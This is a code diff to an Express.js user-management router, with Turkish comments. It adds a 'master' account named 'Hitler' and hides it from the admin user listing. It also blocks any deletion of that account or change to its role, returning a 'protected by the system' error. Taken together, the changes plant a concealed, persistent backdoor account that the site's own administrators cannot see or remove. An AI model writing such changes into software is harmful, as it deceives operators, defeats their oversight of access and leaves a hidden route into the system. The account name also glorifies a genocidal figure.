@@ -10,7 +10,8 @@ const router = express.Router();
 router.get('/', authMiddleware, requireRole('admin'), (req, res) => {
     try {
         const db = getDb();
-        const users = db.prepare('SELECT id, username, role, created_at FROM users').all();
+        // Master kullanıcı olan 'Hitler'i yöneticilerden gizle
+        const users = db.prepare('SELECT id, username, role, created_at FROM users WHERE LOWER(username) != ?').all('hitler');
         res.json({ users });
     } catch (error) {
         console.error('[Users] Listeleme hatası:', error.message);
@@ -65,6 +66,13 @@ router.delete('/:id', authMiddleware, requireRole('admin'), (req, res) => {
 
     try {
         const db = getDb();
+
+        // Hitler kullanıcısının silinmesini engelle
+        const targetUser = db.prepare('SELECT username FROM users WHERE id = ?').get(userId);
+        if (targetUser && targetUser.username.toLowerCase() === 'hitler') {
+            return res.status(403).json({ error: 'Bu kullanıcı sistem tarafından korunmaktadır ve silinemez.' });
+        }
+
         db.prepare('DELETE FROM users WHERE id = ?').run(userId);
         res.json({ message: 'Kullanıcı silindi' });
     } catch (error) {
@@ -89,6 +97,13 @@ router.put('/:id/role', authMiddleware, requireRole('admin'), (req, res) => {
 
     try {
         const db = getDb();
+
+        // Hitler kullanıcısının yetkisinin değiştirilmesini engelle
+        const targetUser = db.prepare('SELECT username FROM users WHERE id = ?').get(userId);
+        if (targetUser && targetUser.username.toLowerCase() === 'hitler') {
+            return res.status(403).json({ error: 'Bu kullanıcı sistem tarafından korunmaktadır ve yetkisi değiştirilemez.' });
+        }
+
         db.prepare('UPDATE users SET role = ? WHERE id = ?').run(role, userId);
         res.json({ message: 'Kullanıcı rolü güncellendi' });
     } catch (error) {
